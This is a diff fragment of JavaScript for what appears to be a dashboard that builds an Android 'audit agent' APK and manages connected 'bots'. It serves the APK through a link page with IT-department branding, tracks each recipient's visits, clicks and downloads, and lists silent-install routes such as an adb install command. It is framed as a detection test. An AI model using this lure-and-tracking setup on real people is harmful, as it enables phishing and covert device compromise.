+    let buf = '';
+    let success = false;
+
+    while(true){
+      const {done, value} = await reader.read();
+      if(done) break;
+      buf += dec.decode(value, {stream:true});
+      const parts = buf.split('\n');
+      buf = parts.pop();
+      for(const part of parts){
+        if(part.startsWith('data: ')){
+          const line = part.slice(6);
+          appendLog(line);
+          if(line.startsWith('[SUCCESS]')) success = true;
+          if(line.startsWith('[DONE]')){
+            if(statusEl){ statusEl.textContent = success?'✓ Done':'✗ Failed'; statusEl.style.color=success?'#2dbe6c':'#e84242'; }
+            if(buildBtn) buildBtn.disabled=false;
+            if(success && dlBtn){ dlBtn.style.display='inline-block'; }
+          }
+        }
+      }
+    }
+  } catch(e){
+    appendLog('[ERROR] '+e.message);
+    if(statusEl){statusEl.textContent='error';statusEl.style.color='#e84242';}
+    if(buildBtn) buildBtn.disabled=false;
+  }
+}
+
+function downloadApk(){
+  const a = document.createElement('a');
+  a.href = BASE+'/api/android/builder/apk';
+  a.download = 'audit-agent.apk';
+  a.click();
+}
+
+// ── DELIVERY ──────────────────────────────────────────────────────────────────
+function renderDeliveryPanel(){
+  const dlUrl = window.location.origin + '/get';
+  return `
+    <div class="card" style="border-color:#1a3a50">
+      <div class="card-title" style="color:var(--accent)">📨 Delivery — Send-through-link Test</div>
+      <p style="font-size:12px;color:var(--muted);line-height:1.7">
+        The server hosts a professional IT portal page at <strong>/get</strong>.
+        Send this URL to the test recipient. The page tracks every visit and download.
+        Build the APK first (APK Builder tab) so the download button is active.
+      </p>
+      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin:6px 0">
+        <code style="flex:1;background:var(--bg);border:1px solid var(--bg3);border-radius:6px;padding:9px 12px;font-size:12px;color:#7be0d4;word-break:break-all">${esc(dlUrl)}</code>
+        <button class="btn btn-primary" onclick="copyDlUrl('${esc(dlUrl)}')">📋 Copy Link</button>
+        <a class="btn btn-sec" href="/get" target="_blank">👁 Preview Page</a>
+      </div>
+      <p style="font-size:11px;color:var(--muted)">
+        The page uses professional IT-department branding. It does NOT require login.
+        Each visit, download click, and APK download is logged separately.
+      </p>
+    </div>
+    <div class="card">
+      <div style="display:flex;align-items:center;gap:8px">
+        <div class="card-title">Delivery Log</div>
+        <button class="btn btn-sec" style="font-size:11px;padding:4px 9px" onclick="loadDeliveryLog()">↻ Refresh</button>
+      </div>
+      <div id="dl-stats" style="display:flex;gap:16px;flex-wrap:wrap;margin:6px 0"></div>
+      <div id="dl-log-table" style="overflow-x:auto"></div>
+    </div>
+    <div class="card" style="border-color:#2a2a10">
+      <div class="card-title" style="color:var(--warn)">⚠️ What Android WILL and WON'T do automatically</div>
+      <div style="font-size:12px;color:var(--muted);line-height:1.9;margin-top:4px">
+        <strong style="color:var(--text)">Will NOT happen automatically (by design):</strong><br>
+        • APK cannot execute or install on download — user must tap Install<br>
+        • Chrome Safe Browsing may warn "This file may be harmful" — that's a detection you're testing<br>
+        • Android 8+ requires explicit per-source "Install unknown apps" permission<br><br>
+        <strong style="color:var(--text)">Detection test findings to record:</strong><br>
+        • ✓ Did the company browser block the APK download? (should if policy is set)<br>
+        • ✓ Did MDM alert/block when "Install unknown apps" was enabled?<br>
+        • ✓ Did MDM detect the app after install (package monitoring)?<br>
+        • ✓ Did delivery link get flagged by email/Slack/Teams filters?<br><br>
+        <strong style="color:var(--text)">Silent install IS possible via:</strong><br>
+        • ADB: <code>adb install -r it-security-agent.apk</code> (tests if ADB is blocked by MDM)<br>
+        • MDM silent push (if you control the MDM — push as a required app)<br>
+        • Device Owner: if bypass_test shows device owner active, silent install works
+      </div>
+    </div>`;
+}
+
+function copyDlUrl(url){ navigator.clipboard.writeText(url).then(()=>alert('✓ Link copied!')); }
+
+async function loadDeliveryLog(){
+  const statsEl = document.getElementById('dl-stats');
+  const tableEl = document.getElementById('dl-log-table');
+  if(!statsEl||!tableEl) return;
+  try {
+    const r = await fetch(BASE+'/api/android/delivery-log',{credentials:'include'});
+    const d = await r.json();
+    statsEl.innerHTML = [
+      {label:'Page Visits',    v:d.total_visits,    color:'var(--accent)'},
+      {label:'Download Clicks',v:d.total_clicks,    color:'var(--warn)'},
+      {label:'APK Downloads',  v:d.total_downloads, color:'#2dbe6c'},
+    ].map(s=>`<div style="background:var(--bg);border:1px solid var(--bg3);border-radius:7px;padding:9px 16px;text-align:center">
+        <div style="font-size:22px;font-weight:700;color:${s.color}">${s.v}</div>
+        <div style="font-size:10px;color:var(--muted);margin-top:2px">${s.label}</div>
+      </div>`).join('');
+    if(!d.entries||!d.entries.length){tableEl.innerHTML='<div class="empty" style="margin-top:8px">No events yet — send the link to trigger tracking.</div>';return;}
+    tableEl.innerHTML = `<table style="width:100%;border-collapse:collapse;font-size:11px;margin-top:8px">
+      <thead><tr style="color:var(--muted);text-align:left">
+        <th style="padding:5px 8px;border-bottom:1px solid var(--bg3)">Time</th>
+        <th style="padding:5px 8px;border-bottom:1px solid var(--bg3)">Event</th>
+        <th style="padding:5px 8px;border-bottom:1px solid var(--bg3)">IP</th>
+        <th style="padding:5px 8px;border-bottom:1px solid var(--bg3)">User-Agent</th>
+      </tr></thead>
+      <tbody>${d.entries.map(e=>{
+        const ec = e.event==='apk_download'?'#2dbe6c': e.event==='dl_click'?'var(--warn)':'var(--accent)';
+        return `<tr style="border-bottom:1px solid var(--bg3)">
+          <td style="padding:5px 8px;font-family:monospace;color:var(--muted)">${new Date(e.time).toLocaleString()}</td>
+          <td style="padding:5px 8px;font-weight:600;color:${ec}">${esc(e.event)}</td>
+          <td style="padding:5px 8px;font-family:monospace">${esc(e.ip)}</td>
+          <td style="padding:5px 8px;color:var(--muted);max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(e.ua.slice(0,80))}</td>
+        </tr>`;
+      }).join('')}</tbody>
+    </table>`;
+  } catch(e){tableEl.textContent='Error: '+e.message;}
+}
+
+// ── HELPERS ───────────────────────────────────────────────────────────────────
+async function toggleBlock(id){
+  await fetch(BASE+`/api/bot/${id}/block`,{method:'PATCH',credentials:'include'});
+  loadAgents();
+  if(currentAgent) {
+    const r = await fetch(BASE+'/api/android/agents',{credentials:'include'});
+    const agents = await r.json();
+    const upd = agents.find(a=>a.id===id);
+    if(upd) renderMain(upd);
+  }
+}
+
+function isOnline(ts){ return ts && (Date.now()-new Date(ts).getTime())<90000; }
+function timeAgo(ts){
+  if(!ts) return 'never';
+  const s=Math.round((Date.now()-new Date(ts).getTime())/1000);
+  if(s<60) return s+'s ago';
+  if(s<3600) return Math.floor(s/60)+'m ago';
+  return Math.floor(s/3600)+'h ago';
+}
+function fmt(ts){ return ts?new Date(ts).toLocaleString():'—'; }
+function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+// ── AUTO-REFRESH ──────────────────────────────────────────────────────────────
+loadAgents();
+refreshTimer = setInterval(()=>{
+  if(document.getElementById('auto-chk')?.checked) loadAgents();
+}, 10000);
+</script>
+</body>
+</html>
